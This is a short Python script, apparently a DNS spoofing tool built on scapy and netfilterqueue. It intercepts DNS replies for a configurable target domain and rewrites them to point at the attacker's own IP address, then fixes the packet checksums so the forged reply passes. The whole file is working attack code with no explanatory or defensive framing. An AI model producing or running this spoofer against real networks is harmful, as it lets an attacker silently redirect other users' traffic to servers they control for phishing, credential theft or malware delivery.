import scapy.all as scapy
from netfilterqueue import NetfilterQueue

target_domain = 'change_me.com'
my_ip = '192.168.1.7'
def interface_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        queue_name = scapy_packet[scapy.DNSQR].qname
        if target_domain in str(queue_name):
            print('[+] Spoofing Target\n')
            answer = scapy.DNSRR(rrname=queue_name, rdata=my_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))

    packet.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(0, interface_packet)
nfqueue.run()
